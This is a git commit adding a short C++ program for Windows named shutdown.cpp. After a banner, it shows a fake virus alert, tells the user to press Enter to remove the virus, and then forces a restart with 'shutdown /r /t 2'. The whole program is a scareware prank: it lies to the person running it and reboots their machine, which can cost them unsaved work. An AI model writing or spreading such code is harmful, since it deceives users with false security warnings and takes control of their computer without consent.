9872d992ac4a4f5bdcf86603129a141a53e49254
Muhammad Fikri <muhfikrisangaji@gmail.com>
2016-05-09 07:03:02 +0700

    Dev C++

---
+++ shutdown.cpp
@@ -0,0 +1,26 @@
+#include <iostream>
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <conio.h>
+#include <string.h>
+using namespace std;
+
+int main(){
+	string jawab;
+	char  ch;
+	
+awal:
+{
+	system ("cls && color c");
+ 	cout<<"\n\n\t\t======================================\n";
+ 	cout<<"\t\t\t      << ARSociety >>"<<endl;
+	cout<<"\t\t======================================\n\n\n";
+	cout<<" ";
+ 	cin>>jawab;
+ 
+	cout<<"\n\n WARNING !!!\n VIRUS IS DETECT ON YOU'RE COMPUTER. YOU'RE SYSTEM IS DOWN AFTER 1 MINUTES \n PRESS ENTER NOW TO DELETE YOU'RE VIRUS\n\n\n "; system("pause");
+	system("c:\\windows\\system32\\shutdown /r /t 2 \n\n");
+
+}
+}
